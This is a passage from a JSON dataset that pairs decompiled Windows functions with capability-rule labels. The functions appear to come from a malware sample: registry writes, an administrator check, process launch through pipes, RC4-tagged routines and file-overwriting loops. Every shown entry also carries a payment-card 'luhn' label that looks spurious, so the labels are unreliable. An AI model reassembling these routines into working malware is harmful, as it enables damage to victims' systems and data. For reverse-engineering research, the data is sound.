        "decompiled_code": "\nuint fcn.004025c9(void)\n\n{\n    uint32_t arg_ch;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    \n    if ((unaff_EDI < unaff_ESI[5]) && (unaff_ESI[4] < unaff_EDI || unaff_ESI[4] == unaff_EDI)) {\n        arg_ch = unaff_ESI[2];\n        if (unaff_ESI[3] < arg_ch) {\n            fcn.00404c96((arg_ch - unaff_ESI[5]) + unaff_EDI, arg_ch, unaff_ESI[1] - arg_ch);\n            unaff_ESI[2] = unaff_ESI[2] + (unaff_EDI - unaff_ESI[5]);\n        }\n        else {\n            fcn.00404c96(*unaff_ESI, arg_ch, unaff_ESI[3] - arg_ch);\n            unaff_ESI[3] = unaff_ESI[3] + (*unaff_ESI - unaff_ESI[2]);\n            unaff_ESI[2] = *unaff_ESI;\n        }\n        unaff_ESI[5] = unaff_EDI;\n        unaff_ESI[1] = *unaff_ESI + unaff_EDI;\n        iVar1 = fcn.00404d43(*unaff_ESI, unaff_EDI);\n        if (iVar1 != 0) {\n            unaff_ESI[2] = unaff_ESI[2] + (iVar1 - *unaff_ESI);\n            unaff_ESI[3] = unaff_ESI[3] + (iVar1 - *unaff_ESI);\n            *unaff_ESI = iVar1;\n            unaff_ESI[1] = iVar1 + unaff_EDI;\n            unaff_ESI[5] = unaff_EDI;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 436
    },
    "00402a0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a0f(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *in_EAX;\n    \n    if ((in_EAX != NULL) && (-1 < arg_8h)) {\n        while ((*in_EAX != 0 && (iVar2 = arg_8h + -1,  arg_8h != 0))) {\n            do {\n                iVar1 = *in_EAX;\n                in_EAX = in_EAX + 1;\n                arg_8h = iVar2;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00402c33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402c33(uint lpValueName, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *unaff_EDI;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(*unaff_EDI, lpValueName, 0, 1, arg_ch, in_EAX * 2);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*unaff_EDI);\n    return iVar1 == 0;\n}\n",
        "token_count": 116
    },
    "00402c5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c5e(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00404d22(arg_ch + 1, 2);\n    iVar1 = arg_ch * 2;\n    arg_ch = arg_14h;\n    fcn.00404c71(arg_8h_00, arg_8h, iVar1);\n    iVar1 = fcn.00402bb8(0x80000001, arg_18h, arg_8h_00, arg_10h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00402bb8(0x80000002, arg_18h, arg_8h_00, arg_10h);\n        if (iVar1 == 0) {\n            arg_ch = 0;\n        }\n    }\n    if (arg_8h_00 != 0) {\n        fcn.00404d6a(arg_8h_00);\n    }\n    return arg_ch;\n}\n",
        "token_count": 267
    },
    "00402cd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402cd3(uint lpDst)\n\n{\n    int32_t in_EAX;\n    uint arg_ch;\n    uint arg_14h;\n    uint32_t uVar1;\n    uint lpSrc;\n    \n    arg_ch = fcn.00404cfe(in_EAX * 2 + 2);\n    arg_14h = fcn.00407f6a(0x25, 0);\n    uVar1 = fcn.00408207(lpDst, in_EAX, fcn.00402c5e, arg_14h);\n    fcn.00402b7a(arg_14h);\n    if (uVar1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(arg_ch, lpDst, in_EAX + 1U);\n        if (in_EAX + 1U < uVar1) {\n            uVar1 = 0;\n        }\n        if (uVar1 == 0) {\n            fcn.00404fd3(lpDst, arg_ch);\n        }\n        else {\n            uVar1 = uVar1 - 1;\n        }\n    }\n    fcn.00404d6a(arg_ch);\n    return uVar1;\n}\n",
        "token_count": 276
    },
    "00402d53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402d53(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402526(arg_8h);\n    arg_8h_01 = fcn.00405061(arg_8h_00);\n    if (arg_8h_01 != 0) {\n        iVar1 = fcn.00404d94(arg_8h_01);\n        iVar2 = fcn.00402cd3(arg_8h_01);\n        if (iVar2 == 0) {\n            iVar1 = iVar1 * 2;\n            iVar2 = arg_8h_01;\n            do {\n                iVar1 = iVar1 * 2;\n                arg_8h_01 = fcn.00404d43(iVar2, iVar1 + 2);\n                if (arg_8h_01 == 0) {\n                    fcn.00404d6a(iVar2);\n                    arg_8h_01 = 0;\n                    break;\n                }\n                iVar3 = fcn.00402cd3(arg_8h_01);\n                iVar2 = arg_8h_01;\n            } while (iVar3 == 0);\n        }\n    }\n    fcn.00402b7a(arg_8h_00);\n    return arg_8h_01;\n}\n",
        "token_count": 340
    },
    "00402dc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402dc9(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    arg_8h_00 = fcn.00407f6a(arg_8h, 0);\n    var_18h = &var_ch;\n    var_1ch = 0x409364;\n    var_14h = 0;\n    var_10h = 0;\n    fcn.00408562();\n    uVar1 = fcn.0040868e(arg_8h_00, &var_1ch);\n    fcn.00402b99(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 191
    },
    "00402f36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f36(uint arg_8h, uint arg_ch)\n\n{\n    uint pExecInfo;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    \n    fcn.00404c43(&var_38h, 0, 0x38);\n    var_30h = arg_ch;\n    var_2ch = arg_8h;\n    pExecInfo = 0x3c;\n    var_20h = 1;\n    var_38h = 0x100;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    return;\n}\n",
        "token_count": 154
    },
    "00403319": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403319(uint noname_0, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((*arg_10h == 0x10) && (*(arg_10h + 0xb) == 0x76)) {\n        iVar1 = fcn.004031b5(1, *arg_14h, arg_ch, arg_14h[1], arg_14h[2]);\n        arg_14h[3] = arg_14h[3] + (0 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 144
    },
    "00403464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403464(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00407f6a(0x21, &var_ch);\n    iVar1 = fcn.00404d94(arg_8h);\n    var_4h = 0;\n    var_8h = 4;\n    iVar1 = fcn.00402bb8(0x80000002, arg_8h, arg_8h + 2 + iVar1 * 2, &var_4h);\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    fcn.00402b57(arg_8h, var_ch);\n    return var_4h;\n}\n",
        "token_count": 192
    },
    "004034c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004034c0(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t *arg_8h;\n    uint32_t uVar4;\n    uint Name;\n    uint ReferencedDomainName;\n    uint peUse;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t *pSid2;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pSid1;\n    uint cchReferencedDomainName;\n    \n    var_18h = 0;\n    arg_8h = NULL;\n    cchReferencedDomainName = 0;\n    pSid1 = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_2_ = 0x500;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &var_1ch);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(var_1ch, 2, 0, cchReferencedDomainName, &cchReferencedDomainName);\n        arg_8h = fcn.00404cfe(cchReferencedDomainName);\n        iVar3 = (*pcVar1)(var_1ch, 2, arg_8h, cchReferencedDomainName, &cchReferencedDomainName);\n        if (((iVar3 != 0) &&\n            (iVar3 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                               (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid1),  iVar3 != 0)) &&\n           (uVar4 = 0,  *arg_8h != 0)) {\n            pSid2 = arg_8h + 1;\n            do {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_EqualSid)(pSid1, *pSid2);\n                if (iVar3 != 0) {\n                    cchReferencedDomainName = 0x104;\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                      (0, arg_8h[uVar4 * 2 + 1], &Name, &cchReferencedDomainName, &ReferencedDomainName\n                                       , &cchReferencedDomainName, &peUse);\n                    if ((iVar3 != 0) || (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 == 0x534)) {\n                        var_18h = 1;\n                    }\n                    break;\n                }\n                pSid2 = pSid2 + 2;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < *arg_8h);\n        }\n    }\n    if (pSid1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid1);\n    }\n    if (arg_8h != NULL) {\n        fcn.00404d6a(arg_8h);\n    }\n    return var_18h;\n}\n",
        "token_count": 749
    },
    "00403c1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "write file on Windows",
            "create pipe",
            "create two anonymous pipes",
            "create a process with modified I/O handles and window",
            "write and execute a file",
            "write pipe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c1a(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t aiStack108 [2];\n    uint uStack100;\n    uint auStack96 [4];\n    uchar auStack80 [28];\n    uint uStack52;\n    ushort uStack48;\n    \n    uStack116 = 0;\n    uStack124 = 0;\n    uStack120 = fcn.00402d53(0x26);\n    uStack136 = 0xffffffff;\n    uStack140 = 0xffffffff;\n    uStack132 = 0xffffffff;\n    uStack128 = 0xffffffff;\n    fcn.00404c43(auStack80, 0, 0x44);\n    fcn.00404c43(aiStack108, 0, 0xc);\n    fcn.00404c43(auStack96, 0, 0x10);\n    uStack100 = 1;\n    aiStack108[0] = 0xc;\n    fcn.00402e5c(&uStack124, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CreatePipe;\n    iVar6 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&uStack136, &uStack140, aiStack108);\n    if (iVar2 != 0) {\n        iVar2 = (*pcVar1)(&stack0xffffff6c, &stack0xffffff70, &uStack124, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_SetHandleInformation;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_SetHandleInformation)(iVar6, 1, 0);\n            if (iVar2 != 0) {\n                iVar2 = (*pcVar1)(unaff_ESI, 1, 0);\n                if (iVar2 != 0) {\n                    uStack48 = 0;\n                    auStack96[0] = 0x44;\n                    uStack52 = 0x101;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                                      (uStack136, 0, 0, 0, 1, 0, 0, 0, auStack96, &iStack112);\n                    if (iVar2 != 0) {\n                        uVar5 = 0;\n                        puVar4 = &uStack128;\n                        uVar3 = fcn.00404d81(arg_8h);\n                        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar6, arg_8h, uVar3, puVar4, uVar5);\n                        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack132, 0xffffffff);\n                        fcn.00402e5c(&uStack140, 1);\n                        uStack132 = 1;\n                    }\n                }\n            }\n        }\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iStack112 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack112);\n    }\n    if (aiStack108[0] != 0) {\n        (*pcVar1)(aiStack108[0]);\n    }\n    if (unaff_EDI != -1) {\n        (*pcVar1)(unaff_EDI);\n    }\n    if (iVar6 != -1) {\n        (*pcVar1)(iVar6);\n    }\n    if (unaff_ESI != -1) {\n        (*pcVar1)(unaff_ESI);\n    }\n    if (unaff_EBX != -1) {\n        (*pcVar1)(unaff_EBX);\n    }\n    fcn.00402b7a(uStack136);\n    fcn.00402b99(arg_8h);\n    return uStack132;\n}\n",
        "token_count": 949
    },
    "00403e55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403e55(void)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    \n    uVar1 = 0;\n    arg_8h = fcn.00407f6a(0x28, 0);\n    if (arg_8h != 0) {\n        uVar1 = fcn.00403dfd(arg_8h, 0);\n        fcn.00402b99(arg_8h);\n    }\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00404b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404b5c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint unaff_EDI;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    arg_8h_00 = fcn.00404cfe(0x14);\n    if (arg_8h_00 != NULL) {\n        arg_8h_00[1] = arg_ch;\n        *arg_8h_00 = arg_10h;\n        uVar1 = fcn.00405061(arg_8h);\n        arg_8h_00[3] = uVar1;\n        arg_8h_00[2] = arg_14h;\n        arg_8h_00[4] = unaff_EDI;\n        fcn.00404457();\n        var_4h = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00404a4c, arg_8h_00, 0, 0);\n        if (var_4h == 0) {\n            fcn.004044c6();\n            fcn.004057e9(arg_8h_00[1]);\n            fcn.00404d6a(arg_8h_00[3]);\n            fcn.00404d6a(arg_8h_00);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 339
    },
    "00404dad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404dad(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = *arg_ch;\n    iVar1 = *arg_8h - uVar2;\n    if (iVar1 == 0) {\n        iVar3 = arg_8h - arg_ch;\n        do {\n            if (uVar2 == 0) break;\n            arg_ch = arg_ch + 1;\n            uVar2 = *arg_ch;\n            iVar1 = *(iVar3 + arg_ch) - uVar2;\n        } while (iVar1 == 0);\n    }\n    if (iVar1 < 0) {\n        return -1;\n    }\n    if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 200
    },
    "00404e26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404e26(int16_t *arg_8h, uint arg_ch)\n\n{\n    while( true ) {\n        if (*arg_8h == 0) {\n            if (*arg_8h != arg_ch) {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        if (*arg_8h == arg_ch) break;\n        arg_8h = arg_8h + 1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 114
    },
    "00404fd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404fd3(int32_t arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_8h - arg_ch;\n    do {\n        iVar1 = *arg_ch;\n        *(iVar2 + arg_ch) = iVar1;\n        arg_ch = arg_ch + 1;\n    } while (iVar1 != 0);\n    return arg_8h;\n}\n",
        "token_count": 107
    },
    "00405261": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405261(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004050cc(arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 49
    },
    "0040527b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040527b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004050cc(arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 50
    },
    "00405410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405410(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405295(arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 49
    },
    "0040542a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040542a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405295(arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 50
    },
    "0040555d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040555d(uint hFile, uint lpBuffer)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t iVar2;\n    uint dwMoveMethod;\n    uint var_ch;\n    int32_t lpNumberOfBytesWritten;\n    \n    iVar2 = 3;\n    fcn.00404c43(lpBuffer, 0, 0x40000);\n    do {\n        var_ch = *(unaff_EBX + -4 + iVar2 * 8);\n        iVar2 = iVar2 + -1;\n        dwMoveMethod = *(unaff_EBX + iVar2 * 8);\n        iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, dwMoveMethod, var_ch, &dwMoveMethod, 0);\n        if (iVar1 == 0) goto code_r0x004055c1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, lpBuffer, 0x40000, &lpNumberOfBytesWritten, 0);\n        if ((iVar1 == 0) || (lpNumberOfBytesWritten != 0x40000)) goto code_r0x004055c1;\n    } while (iVar2 != 0);\n    iVar2 = -1;\ncode_r0x004055c1:\n    return iVar2 == 0;\n}\n",
        "token_count": 297
    },
    "004056ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004056ad(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404e69(arg_8h, 0x5c);\n    if (iVar1 != 0) {\n        return iVar1 + 2;\n    }\n    return arg_8h;\n}\n",
        "token_count": 79
    },
    "004056f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004056f4(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00404c43(arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 45
    },
    "00405731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00405731(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.00404cfe(0x28);\n    if (puVar1 != NULL) {\n        puVar1[9] = 0x110102;\n        iVar2 = fcn.00404cfe(0x110102);\n        puVar1[8] = iVar2;\n        if (iVar2 == 0) {\n            fcn.00405697();\n            puVar1 = NULL;\n        }\n        else {\n            fcn.00404c71(puVar1 + 6, arg_ch, 6);\n            fcn.00404c71(puVar1 + 1, arg_10h, 0x14);\n            *puVar1 = arg_8h;\n        }\n    }\n    return puVar1;\n}\n",
        "token_count": 212
    },
    "0040578b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040578b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = fcn.00404cfe(0xa4);\n    if (arg_8h_00 != 0) {\n        fcn.00404c71(arg_8h_00, arg_8h, 0x20);\n        fcn.00404c71(arg_8h_00 + 0x20, arg_ch, 0x80);\n        uVar1 = fcn.004056ca(0x20);\n        *(arg_8h_00 + 0xa0) = uVar1;\n        uVar1 = fcn.004056ca(0x80);\n        *(arg_8h_00 + 0xa0) = uVar1;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 211
    },
    "004057e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057e9(uint arg_8h)\n\n{\n    uint uVar1;\n    uint unaff_EBP;\n    \n    fcn.00404c43(arg_8h, 0, 0xa4);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h, unaff_EBP);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 103
    },
    "004061b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004061b2(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    do {\n        *(in_EAX + *(in_EAX + 0x40)) = *(uVar3 + 0x40c6e0);\n        *(in_EAX + 0x40) = *(in_EAX + 0x40) + 1;\n        if (*(in_EAX + 0x40) == 0x40) {\n            in_EAX = fcn.00405efa();\n            puVar1 = in_EAX + 0x48;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + 0x200;\n            *(in_EAX + 0x4c) = *(in_EAX + 0x4c) + (0xfffffdff < uVar2);\n            *(in_EAX + 0x40) = 0;\n        }\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0x20);\n    return;\n}\n",
        "token_count": 266
    },
    "00406209": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00406209(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    \n    uVar1 = arg_8h & 0x8000000f;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffff0) + 1;\n    }\n    uVar2 = 1;\n    uVar3 = 1;\n    if (0 < uVar1) {\n        do {\n            uVar2 = uVar3 * 2;\n            uVar1 = uVar1 - 1;\n            uVar3 = uVar2;\n        } while (uVar1 != 0);\n    }\n    return (uVar2 & *(*(in_ECX + 0xc) + (arg_8h + (arg_8h >> 0x1f & 0xfU) >> 4) * 2)) != 0;\n}\n",
        "token_count": 235
    },
    "00406284": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406284(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if (*(unaff_ESI + 6) < unaff_EDI) {\n        iVar2 = *(unaff_ESI + 6) * 2;\n        if (iVar2 <= unaff_EDI) {\n            iVar2 = unaff_EDI;\n        }\n        *(unaff_ESI + 6) = iVar2;\n        uVar1 = fcn.00404d43(*(unaff_ESI + 0xc), iVar2 * 2);\n        *(unaff_ESI + 0xc) = uVar1;\n    }\n    iVar2 = *(unaff_ESI + 4);\n    if (iVar2 < unaff_EDI) {\n        fcn.00404c43(*(unaff_ESI + 0xc) + iVar2 * 2, 0, (unaff_EDI - iVar2) * 2);\n    }\n    *(unaff_ESI + 4) = unaff_EDI;\n    return;\n}\n",
        "token_count": 249
    },
    "00406541": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406541(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t iVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = in_EAX + -1;\n    fcn.00404c43(arg_ch, 0, in_EAX);\n    iVar2 = 0;\n    if (0 < *(unaff_ESI + 4)) {\n        do {\n            uVar1 = 0;\n            var_4h = 0;\n            do {\n                *(iVar3 + arg_ch) = (*(*(unaff_ESI + 0xc) + iVar2 * 2) & 0xff << (var_4h & 0x1f)) >> ((uVar1 & 3) << 3);\n                iVar3 = iVar3 + -1;\n                if (iVar3 < 0) goto code_r0x004065a9;\n                var_4h = var_4h + 8;\n                uVar1 = uVar1 + 1;\n            } while (var_4h < 0x10);\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(unaff_ESI + 4));\n    }\ncode_r0x004065a9:\n    fcn.0040634a();\n    return;\n}\n",
        "token_count": 329
    },
    "0040672e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040672e(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    int16_t *piVar5;\n    uint16_t uVar6;\n    int32_t var_4h;\n    \n    uVar6 = 0;\n    iVar1 = *(arg_ch + 4);\n    if (*(arg_ch + 4) <= *(arg_10h + 4)) {\n        iVar1 = *(arg_10h + 4);\n    }\n    var_4h = iVar1;\n    fcn.00406284();\n    fcn.00406284();\n    puVar3 = *(arg_ch + 0xc);\n    piVar5 = *(arg_10h + 0xc);\n    do {\n        uVar4 = *piVar5 + *puVar3;\n        uVar2 = uVar4 + uVar6;\n        piVar5 = piVar5 + 1;\n        uVar6 = uVar4 < *puVar3 || uVar2 < uVar4;\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    *puVar3 = uVar6;\n    fcn.0040634a();\n    fcn.004061e8();\n    return;\n}\n",
        "token_count": 343
    },
    "004067be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004067be(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    iVar1 = fcn.00406406();\n    fcn.00404c71(*(iVar1 + 0xc), *(unaff_ESI + 0xc), *(unaff_ESI + 4) * 2);\n    return iVar1;\n}\n",
        "token_count": 86
    },
    "00406834": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
